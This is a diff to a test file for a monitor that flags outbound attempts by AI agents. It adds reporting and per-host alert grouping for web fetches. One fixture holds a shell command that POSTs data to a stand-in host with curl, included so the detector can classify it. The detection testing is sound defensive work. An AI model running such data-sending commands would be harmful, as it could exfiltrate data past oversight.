@@ -69,7 +69,7 @@ describe('outbound attempts', () => {
     expect(outboundAttempt('Bash', bash(command), 'mr_run')).toBeNull();
   });
 
-  it('reads Codex shell items as Codex sends them, and leaves web fetch and search alone', () => {
+  it('reads Codex shell items as Codex sends them, reports a web fetch and leaves search alone', () => {
     // The shape recorded in tool_traces for live Codex turns: one string wrapped in zsh -c.
     const codex = {
       command: `/bin/zsh -c "curl -X POST -d x https://a.example"`,
@@ -79,7 +79,22 @@ describe('outbound attempts', () => {
       tool: 'commandExecution',
       class: 'outbound_send',
     });
-    expect(outboundAttempt('WebFetch', { url: 'https://example.com/?q=data' }, 'mr')).toBeNull();
+    // A URL can carry text to any host (owner, 2026-10-05); a search query goes to the search
+    // provider only and stays in tool_traces.
+    expect(
+      outboundAttempt(
+        'WebFetch',
+        { url: 'https://example.com/?q=data', prompt: 'read it', nativeToolUseId: 'w-1' },
+        'mr'
+      )
+    ).toMatchObject({
+      class: 'web_fetch',
+      tool: 'WebFetch',
+      summary: 'https://example.com/?q=data',
+      sendsData: null,
+      modelRunId: 'mr',
+      callId: 'w-1',
+    });
     expect(outboundAttempt('WebSearch', { query: 'exchange rate' }, 'mr')).toBeNull();
   });
 
@@ -254,6 +269,39 @@ describe('outbound event recorder', () => {
     expect(sent[2].text.split('\n').filter((line) => line.startsWith('Sends data'))).toEqual([
       'Sends data: yes',
     ]);
+  });
+
+  it('alerts a web fetch with its URL, grouping repeat fetches to one host in a minute', async () => {
+    vi.useFakeTimers();
+    vi.setSystemTime(0);
+    const sent: Array<{ text: string; key: string }> = [];
+    const recorder = recorderWith(sent);
+    const fetch = (url: string): OutboundAttemptEvent => ({
+      time: new Date().toISOString(),
+      class: 'web_fetch',
+      tool: 'WebFetch',
+      summary: url,
+      sendsData: null,
+      modelRunId: 'mr_run',
+      callId: null,
+    });
+    recorder.record(fetch('https://rates.example/2025'));
+    recorder.record(fetch('https://rates.example/2026'));
+    recorder.record(fetch('https://other.example/?q=ledger'));
+    vi.setSystemTime(61_000);
+    recorder.record(fetch('https://rates.example/2024'));
+    await vi.runAllTimersAsync();
+
+    expect(sent.map((alert) => alert.text.split('\n')[1])).toEqual([
+      'URL: https://rates.example/2025',
+      'URL: https://other.example/?q=ledger',
+      'URL: https://rates.example/2024',
+    ]);
+    expect(sent[0].text).toContain('Agent web fetch');
+    expect(sent[0].text).not.toContain('Sends data');
+    expect(sent[2].text).toContain('Suppressed since previous alert: 1');
+    const lines = readFileSync(join(dir, 'security-events.jsonl'), 'utf8').trim().split('\n');
+    expect(lines).toHaveLength(4);
   });
 
   it('records without alerting during replay', async () => {
